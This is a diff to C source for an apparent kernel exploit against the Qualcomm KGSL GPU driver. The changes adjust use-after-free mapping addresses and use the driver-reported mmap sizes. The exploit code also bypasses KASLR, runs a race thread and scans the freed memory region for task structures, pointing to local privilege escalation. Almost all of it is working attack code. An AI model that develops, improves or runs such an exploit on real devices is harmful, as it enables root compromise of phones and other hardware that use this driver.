@@ -69,13 +69,13 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-#define UAF_ADDR         0x50000000ULL
+#define UAF_ADDR         0x40000000ULL
 #define UAF_SIZE         0x10004000ULL
-#define OVERLAP_ADDR     0x50001000ULL
+#define OVERLAP_ADDR     0x40001000ULL
 #define OVERLAP_SIZE     0x7000ULL
-#define BOGUS_ADDR       0x50002000ULL
+#define BOGUS_ADDR       0x40002000ULL
 #define BOGUS_SIZE       0x1000ULL
-#define PLACEHOLDER_ADDR 0x51000000ULL
+#define PLACEHOLDER_ADDR 0x41000000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
 #define VMLINUX_TEXT      0xffffffc010080000ULL
@@ -176,10 +176,18 @@ static uint64_t detect_kaslr(void) {
     return ic_addr;
 }
 
-static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
+static int gpuobj_alloc_full(int fd, uint64_t size, uint64_t flags, uint64_t *mmapsize, unsigned int *id) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
-    return a.id;
+    if (mmapsize) *mmapsize = a.mmapsize;
+    if (id) *id = a.id;
+    return 0;
+}
+
+static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
+    unsigned int id;
+    gpuobj_alloc_full(fd, size, flags, NULL, &id);
+    return id;
 }
 
 static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
@@ -188,12 +196,14 @@ static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
     return p;
 }
 
-static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
+static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags, uint64_t *size, uint64_t *va_len) {
     struct kgsl_gpuobj_info inf = { .id = id };
     int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
     if (ret == 0) {
         if (gpuaddr) *gpuaddr = inf.gpuaddr;
         if (flags) *flags = inf.flags;
+        if (size) *size = inf.size;
+        if (va_len) *va_len = inf.va_len;
     }
     return ret;
 }
@@ -276,19 +286,29 @@ int main(int argc, char **argv) {
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
 
-    munmap((void*)UAF_ADDR, UAF_SIZE);
-    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
-    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
+    uint64_t uaf_mmapsize = 0;
+    unsigned int uaf_id = 0;
+    gpuobj_alloc_full(kgsl_fd, UAF_SIZE, alloc_flags, &uaf_mmapsize, &uaf_id);
+    printf("  uaf_id=%u mmapsize=0x%lx\n", uaf_id, (unsigned long)uaf_mmapsize);
+
+    munmap((void*)UAF_ADDR, uaf_mmapsize);
+    void *uaf_m = mmap((void*)UAF_ADDR, uaf_mmapsize, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (uaf_m == MAP_FAILED) die("mmap UAF");
-    munmap(uaf_m, UAF_SIZE);
+    if (uaf_m == MAP_FAILED) {
+        perror("mmap UAF");
+        printf("errno=%d\n", errno);
+        exit(1);
+    }
+    munmap(uaf_m, uaf_mmapsize);
 
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
-    munmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE);
-    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
+    uint64_t ph_mmapsize = 0;
+    unsigned int ph_id = 0;
+    gpuobj_alloc_full(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags, &ph_mmapsize, &ph_id);
+    munmap((void*)PLACEHOLDER_ADDR, ph_mmapsize);
+    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, ph_mmapsize, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
     if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
 
@@ -298,7 +318,7 @@ int main(int argc, char **argv) {
 
     printf("[*] Phase 2: Race\n");
 
-    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
+    unsigned int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
 
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
@@ -424,7 +444,7 @@ int main(int argc, char **argv) {
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
     void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
     uint64_t ib_ga = 0, ib_flags = 0;
-    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags);
+    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags, NULL, NULL);
     printf("  IB id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", ib_id,
         (unsigned long)ib_ga, (unsigned long)ib_flags,
         (unsigned long)(ib_flags & KGSL_CACHEMODE_MASK));
@@ -432,16 +452,16 @@ int main(int argc, char **argv) {
     int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
     void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
     uint64_t dst_ga = 0, dst_flags = 0;
-    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
+    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags, NULL, NULL);
     printf("  DST id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", dst_id,
         (unsigned long)dst_ga, (unsigned long)dst_flags,
         (unsigned long)(dst_flags & KGSL_CACHEMODE_MASK));
 
     printf("  Scanning [0x%lx - 0x%lx]...\n",
         (unsigned long)(UAF_ADDR + 0x1000),
-        (unsigned long)(UAF_ADDR + UAF_SIZE));
+        (unsigned long)(UAF_ADDR + uaf_mmapsize));
 
-    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
+    uint64_t end_va = UAF_ADDR + uaf_mmapsize - 0x1000;
     uint64_t task_pages[16];
     uint32_t task_comm_offs[16];
     int n_task = 0;
